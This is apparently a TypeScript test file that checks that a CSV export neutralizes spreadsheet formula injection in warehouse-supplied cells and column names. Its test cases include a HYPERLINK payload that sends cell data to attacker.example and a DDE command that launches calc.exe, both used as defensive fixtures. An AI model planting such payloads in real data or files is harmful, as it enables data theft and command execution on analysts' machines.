// A `rows` blob is the result of a warehouse query, so both its column names and
// its cells are third-party data — a display name, a ticket subject, a product
// review that landed in a table the org connected. The CSV this export writes is
// exactly the file an analyst opens in Excel, where a cell leading with `=`, `+`,
// `-`, `@`, TAB or CR is EVALUATED: a HYPERLINK that exfiltrates adjacent cells on
// click, or a DDE payload. Those cells are neutralized here the same way the
// backend's own CSV export neutralizes its member-supplied column.

import type { BlobPage } from "@alkera/chat-model";
import { afterEach, describe, expect, it, vi } from "vitest";

import { installChatRuntime } from "./runtime";
import type { ChatDataSource, ChatHost } from "./ChatDataSource";
import { exportBlob } from "./exportBlob";

// The shell the export hands its file to: `saveFile` is the one call that
// matters (a Save dialog in VS Code, a download in the browser).
const hostMock = {
  kind: "vscode" as const,
  saveFile: vi.fn<ChatHost["saveFile"]>(async () => {}),
  runCommand: async () => {},
  openFile: async () => {},
  workspacePath: () => null,
  openPlanDocument: async () => {},
  subscribe: () => () => {},
  account: () => ({ email: null, webAppUrl: null }),
  onAccountChange: () => () => {},
  auth: { openBrowser: () => {} },
  engine: { request: async () => ({}) as never },
} satisfies ChatHost;

/** The pages the blob reads back, one call at a time. */
const fetchBlob = vi.fn<ChatDataSource["fetchBlob"]>();

installChatRuntime({
  source: { fetchBlob } as unknown as ChatDataSource,
  host: hostMock,
});

function rowsPage(columns: string[], rows: unknown[][]): BlobPage {
  return {
    kind: "rows",
    columns,
    rows,
    text: "",
    offset: 0,
    limit: 1000,
    total: rows.length,
    returned: rows.length,
    hasMore: false,
    nextOffset: null,
  };
}

/** The CSV the export handed to the host. */
async function csvOf(columns: string[], rows: unknown[][]): Promise<string> {
  fetchBlob.mockResolvedValue(rowsPage(columns, rows));
  await exportBlob({ handle: "abcdef0123456789", name: "result", refType: "rows" });
  return hostMock.saveFile.mock.calls[0][1] as string;
}

/** The single data row read back the way a spreadsheet reads it: RFC-4180 unquoted. */
function dataCells(csv: string): string[] {
  const row = csv.slice(csv.indexOf("\n") + 1);
  const cells: string[] = [];
  let i = 0;
  for (;;) {
    if (row[i] === '"') {
      let out = "";
      i += 1;
      while (i < row.length) {
        if (row[i] !== '"') {
          out += row[i];
          i += 1;
          continue;
        }
        if (row[i + 1] === '"') {
          out += '"';
          i += 2;
          continue;
        }
        i += 1;
        break;
      }
      cells.push(out);
    } else {
      const next = row.indexOf(",", i);
      const end = next === -1 ? row.length : next;
      cells.push(row.slice(i, end));
      i = end;
    }
    if (i >= row.length) return cells;
    i += 1; // step over the separating comma
  }
}

afterEach(() => {
  vi.restoreAllMocks();
  fetchBlob.mockReset();
  hostMock.saveFile.mockReset();
});

describe("exportBlob CSV formula neutralization", () => {
  it.each([
    { id: "equals — HYPERLINK exfiltration", cell: '=HYPERLINK("https://attacker.example/?d="&A1,"details")' },
    { id: "equals — DDE command", cell: "=cmd|'/c calc.exe'!A1" },
    { id: "plus", cell: "+1+1" },
    { id: "minus", cell: "-1+1" },
    { id: "at", cell: "@SUM(A1:A9)" },
    { id: "tab", cell: "\tvalue" },
    { id: "carriage return", cell: "\rvalue" },
  ])("prefixes an apostrophe on a formula-leading cell ($id)", async ({ cell }) => {
    // The apostrophe is what stops evaluation; the spreadsheet strips it on
    // display, so the analyst still reads the original text.
    expect(dataCells(await csvOf(["id", "label"], [[1, cell]]))[1]).toBe(`'${cell}`);
  });

  it("neutralizes a formula-leading COLUMN NAME too", async () => {
    // The header row is warehouse-supplied as well (an aliased column, a pivoted
    // value promoted to a column name).
    const csv = await csvOf(["=1+1", "label"], [[1, "ok"]]);
    expect(csv.split("\n")[0]).toBe("'=1+1,label");
  });

  it("puts the apostrophe inside the quotes when the cell also needs quoting", async () => {
    // A leading CR is both a formula lead and a character RFC-4180 must quote —
    // an apostrophe outside the quotes would corrupt the row instead of escaping it.
    const csv = await csvOf(["a"], [["\r=1+1"]]);
    expect(csv.split("\n").slice(1).join("\n")).toBe(`"'\r=1+1"`);
  });

  it.each([
    { id: "ordinary text", cell: "row-0" },
    { id: "leading digit", cell: "2026-07-01" },
    { id: "leading dot", cell: ".hidden" },
    { id: "embedded equals", cell: "a=b" },
    { id: "leading space", cell: " =1+1" },
    { id: "comma", cell: "a,b" },
    { id: "quote", cell: 'has "quote"' },
  ])("leaves a benign cell byte-identical ($id)", async ({ cell }) => {
    expect(dataCells(await csvOf(["a"], [[cell]]))[0]).toBe(cell);
  });

  it.each([
    { id: "negative number", value: -1.5, expected: "-1.5" },
    { id: "zero", value: 0, expected: "0" },
    { id: "null", value: null, expected: "" },
    { id: "boolean", value: false, expected: "false" },
  ])("leaves a non-string cell as it was ($id)", async ({ value, expected }) => {
    // A negative figure leads with a formula character but is a number the query
    // returned — apostrophising it would make every negative column text in the
    // spreadsheet, which is the whole point of exporting rows.
    //
    // The row carries a second, non-empty cell on purpose: `toCsv` drops a row
    // whose cells are ALL empty, so a lone null column would test that quirk
    // rather than how a null cell is written.
    expect(dataCells(await csvOf(["a", "keep"], [[value, "x"]]))[0]).toBe(expected);
  });

  it("leaves a JSON-serialized object cell alone", async () => {
    // An object cell serializes to JSON, which never leads with a formula
    // character — it must not gain a stray apostrophe.
    expect(dataCells(await csvOf(["a"], [[{ k: "=1+1" }]]))[0]).toBe('{"k":"=1+1"}');
  });
});
